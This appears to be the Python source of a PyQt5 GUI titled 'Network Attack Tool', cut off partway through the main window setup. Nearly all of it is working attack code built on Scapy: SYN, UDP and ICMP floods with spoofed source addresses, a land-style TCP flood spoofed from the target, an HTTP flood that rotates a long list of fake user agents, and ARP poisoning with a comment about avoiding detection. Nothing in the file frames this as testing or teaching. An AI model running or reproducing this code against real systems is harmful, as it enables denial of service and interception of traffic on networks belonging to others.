from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QPushButton, QComboBox, QLineEdit, QLabel,
    QVBoxLayout, QHBoxLayout, QWidget, QGroupBox, QTextEdit, QMessageBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from scapy.all import IP, TCP, ICMP, UDP, Raw, send, ARP, Ether, sendp, srp
import random
import sys
import requests
import time

class LogRedirector:
    """Custom class to redirect print statements to a QTextEdit widget."""
    def __init__(self, log_widget):
        self.log_widget = log_widget

    def write(self, message):
        if message.strip():
            self.log_widget.append(message.strip())

    def flush(self):
        pass


class SynFloodThread(QThread):
    """Thread to run the SYN Flood attack without blocking the UI."""
    log_signal = pyqtSignal(str)

    def __init__(self, target_ip, target_port, packet_count, parent=None):
        super().__init__(parent)
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_count = packet_count
        self.running = True

    def run(self):
        self.log_signal.emit(f"Starting SYN flood on {self.target_ip}:{self.target_port} with {self.packet_count} packets.")
        for i in range(self.packet_count):
            if not self.running:
                self.log_signal.emit("SYN flood stopped by user.")
                break

            src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            src_port = random.randint(1024, 65535)
            ip_header = IP(src=src_ip, dst=self.target_ip)
            tcp_header = TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000))
            packet = ip_header / tcp_header
            send(packet, verbose=0)
            self.log_signal.emit(f"Packet {i + 1}/{self.packet_count} sent from {src_ip}:{src_port} to {self.target_ip}:{self.target_port}")
        self.log_signal.emit("SYN flood attack completed.")

    def stop(self):
        self.running = False

class SynonymousFloodThread(QThread):
    """Thread to run a simple TCP Flood attack without blocking the UI."""
    log_signal = pyqtSignal(str)

    def __init__(self, target_ip, target_port, packet_count, parent=None):
        super().__init__(parent)
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_count = packet_count
        self.running = True

    def run(self):
        self.log_signal.emit(f"Starting TCP flood on {self.target_ip}:{self.target_port} with {self.packet_count} packets spoofed from {self.target_ip}.")
        for i in range(self.packet_count):
            if not self.running:
                self.log_signal.emit("TCP flood stopped by user.")
                break

            ip_header = IP(src=self.target_ip, dst=self.target_ip)
            tcp_header = TCP(sport=self.target_port, dport=self.target_port, seq=random.randint(1000, 9000))
            packet = ip_header / tcp_header
            send(packet, verbose=0)
            self.log_signal.emit(f"Packet {i + 1}/{self.packet_count} sent from {self.target_ip}:{self.target_port} to {self.target_ip}:{self.target_port}")
        self.log_signal.emit("Synonymous flood attack completed.")

    def stop(self):
        self.running = False


class UdpFloodThread(QThread):
    """Thread to run the UDP Flood attack with spoofed IP addresses and ports."""
    log_signal = pyqtSignal(str)

    def __init__(self, target_ip, target_port, packet_count, parent=None):
        super().__init__(parent)
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_count = packet_count
        self.running = True

    def run(self):
        self.log_signal.emit(f"Starting UDP flood with spoofed IPs and ports on {self.target_ip}:{self.target_port} with {self.packet_count} packets.")
        for i in range(self.packet_count):
            if not self.running:
                self.log_signal.emit("UDP flood stopped by user.")
                break

            try:
                # Generate random spoofed source IP and source port
                src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
                src_port = random.randint(1024, 65535)

                # Create the packet
                ip_layer = IP(src=src_ip, dst=self.target_ip)
                udp_layer = UDP(sport=src_port, dport=self.target_port)
                payload = Raw(load=random._urandom(1024))

                packet = ip_layer / udp_layer / payload

                # Send the packet
                send(packet, verbose=0)

                self.log_signal.emit(f"Packet {i + 1}/{self.packet_count} sent from {src_ip}:{src_port} to {self.target_ip}:{self.target_port}")

            except Exception as e:
                self.log_signal.emit(f"Error: {e}")
                break

        self.log_signal.emit("UDP flood attack completed.")

    def stop(self):
        self.running = False
        
# IcmpFloodThread to handle ICMP Flood
class IcmpFloodThread(QThread):
    """Thread to run the ICMP Flood attack without blocking the UI."""
    log_signal = pyqtSignal(str)

    def __init__(self, target_ip, packet_count, parent=None):
        super().__init__(parent)
        self.target_ip = target_ip
        self.packet_count = packet_count
        self.running = True

    def run(self):
        self.log_signal.emit(f"Starting ICMP flood on {self.target_ip} with {self.packet_count} packets.")
        for i in range(self.packet_count):
            if not self.running:
                self.log_signal.emit("ICMP flood stopped by user.")
                break

            spoofed_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
            packet = IP(dst=self.target_ip, src=spoofed_ip)/ICMP()
            send(packet, verbose=0)
            self.log_signal.emit(f"Packet {i + 1}/{self.packet_count} sent from {spoofed_ip} to {self.target_ip}")

        self.log_signal.emit("ICMP flood attack completed.")

    def stop(self):
        self.running = False
        
        
class HttpFloodThread(QThread):
    """Thread to perform HTTP Flood attack."""
    log_signal = pyqtSignal(str)

    def __init__(self, target_url, num_requests, parent=None):
        super().__init__(parent)
        self.target_url = target_url
        self.num_requests = num_requests
        self.running = True

    def run(self):
        headers_useragents = []
        
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
        headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
        headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
        headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
        headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
        headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
        headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
        headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
        headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
        headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
        headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
        headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
        headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
        headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
        headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
        headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
        headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
        headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
        headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
        headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
        headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
        headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
        headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
        headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
        headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
        headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
        headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
        headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
        headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
        headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
        headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
        headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
        headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
        headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
        headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
        headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
        headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
        headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
        headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
        headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
        headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
        headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
        headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
        headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
        headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
        headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
        headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
        headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
        headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
        headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
        headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
        headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
        headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
        headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
        headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
        headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
        headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
        headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
        headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
        headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
        headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
        headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
        headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
        headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
        headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
        headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
        headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
        headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
        headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
        headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')

        self.log_signal.emit(f"Starting HTTP Flood on {self.target_url} with {self.num_requests} requests.")
        for i in range(self.num_requests):
            if not self.running:
                self.log_signal.emit("HTTP Flood stopped by user.")
                break

            headers = {"User-Agent": random.choice(headers_useragents)}
            try:
                response = requests.get(self.target_url, headers=headers)
                self.log_signal.emit(f"Request {i + 1}/{self.num_requests} sent with status code: {response.status_code}")
            except Exception as e:
                self.log_signal.emit(f"Error during HTTP request: {e}")
                break
        self.log_signal.emit("HTTP Flood attack completed.")

    def stop(self):
        self.running = False
        
class ArpPoisonThread(QThread):
    """Thread to run the ARP Poisoning attack without blocking the UI."""
    log_signal = pyqtSignal(str)

    def __init__(self, target_ip, gateway_ip, parent=None):
        super().__init__(parent)
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.running = True
        self.target_mac = None
        self.gateway_mac = None

    def run(self):
        self.log_signal.emit(f"Starting ARP poisoning on target: {self.target_ip} and gateway: {self.gateway_ip}")
        
        # Get the MAC addresses
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)

        if not self.target_mac or not self.gateway_mac:
            self.log_signal.emit("Error: Could not retrieve MAC addresses.")
            return
        
        self.log_signal.emit(f"Target MAC: {self.target_mac}")
        self.log_signal.emit(f"Gateway MAC: {self.gateway_mac}")

        while self.running:
            self.arp_poison(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)
            time.sleep(2)  # Adjust the interval to avoid detection

        self.log_signal.emit("ARP poisoning attack completed.")
        self.restore_arp()  # Call restore_arp when done

    def stop(self):
        self.running = False

    def arp_poison(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Function to send poisoned ARP packets."""
        target_arp = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
        gateway_arp = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

        sendp(Ether(dst=target_mac)/target_arp, verbose=False)
        sendp(Ether(dst=gateway_mac)/gateway_arp, verbose=False)
        self.log_signal.emit(f"Poisoned ARP: Target {target_ip} -> Gateway {gateway_ip}")
    
    def get_mac(self, ip, retries=3, timeout=2):
        """Function to get the MAC address of the given IP with retries."""
        for _ in range(retries):
            arp_request = ARP(op=1, pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = srp(arp_request_broadcast, timeout=timeout, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                self.log_signal.emit(f"Retrying to get MAC address for {ip}...")
                time.sleep(timeout)
        
        self.log_signal.emit(f"Failed to get MAC address for {ip}")
        return None

    def restore_arp(self):
        """Restoring the correct ARP entries after poisoning."""
        if self.target_mac and self.gateway_mac:
            target_arp = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
            gateway_arp = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)

            sendp(Ether(dst=self.target_mac)/target_arp, verbose=False, count=5)
            sendp(Ether(dst=self.gateway_mac)/gateway_arp, verbose=False, count=5)
            self.log_signal.emit(f"Restored ARP: Target {self.target_ip} and Gateway {self.gateway_ip}")
        else:
            self.log_signal.emit("Error: Missing MAC addresses to restore ARP.")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Network Attack Tool")
        self.setGeometry(100, 100, 600, 500)
        self.attack_running = False
        self.previous_attack_type = "SYN Flood"

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout()
        central_widget.setLayout(main_layout)

        header_layout = QHBoxLayout()
        title_label = QLabel("Network Attack Tool")
        title_label.setStyleSheet("font-size: 20px; font-weight: bold; color: #dc3545;")
        header_layout.addWidget(title_label)
        header_layout.setAlignment(Qt.AlignCenter)
        main_layout.addLayout(header_layout)

        select_group = QGroupBox("Attack Type")
        select_layout = QVBoxLayout()
        self.attack_combo = QComboBox()
        self.attack_combo.addItems(["SYN Flood", "UDP Flood", "ICMP Flood", "HTTP Flood", "ARP Poisoning", "Synonymous Flood"])
        self.attack_combo.currentIndexChanged.connect(self.update_fields)
        select_layout.addWidget(self.attack_combo)
        select_group.setLayout(select_layout)
        main_layout.addWidget(select_group)

        self.config_group = QGroupBox("Configuration")
        config_layout = QVBoxLayout()
        self.config_group.setLayout(config_layout)
        main_layout.addWidget(self.config_group)

        self.fields = {}
        self.field_definitions = {
            "ip_label": "Target IP Address:", 
            "port_label": "Target Port:", 
            "url_label": "Target URL:", 
            "packet_count_label": "Packet Count:",
            "gateway_ip_label": "Gateway IP:"
        }

        self.attack_configs = {
            "SYN Flood": ["ip_label", "port_label", "packet_count_label"],
            "UDP Flood": ["ip_label", "port_label", "packet_count_label"],
            "ICMP Flood": ["ip_label", "packet_count_label"],
            "HTTP Flood": ["url_label", "packet_count_label"],
            "ARP Poisoning": ["ip_label", "gateway_ip_label"],
            "Synonymous Flood": ["ip_label", "port_label", "packet_count_label"]
        }

        self.create_fields(config_layout)
        self.log_group = QGroupBox("Log")
        log_layout = QVBoxLayout()
        self.log_widget = QTextEdit()
        self.log_widget.setReadOnly(True)
        log_layout.addWidget(self.log_widget)
        self.log_group.setLayout(log_layout)
        main_layout.addWidget(self.log_group)

        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.start_button.setStyleSheet("background-color: green; color: white; font-weight: bold; padding: 8px;")
        self.start_button.clicked.connect(self.start_attack)
        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setStyleSheet("background-color: red; color: white; font-weight: bold; padding: 8px;")
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setVisible(False)
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        main_layout.addLayout(button_layout)

        self.update_fields()
        sys.stdout = LogRedirector(self.log_widget)

    def create_fields(self, layout):
        for key, label_text in self.field_definitions.items():
            label = QLabel(label_text)
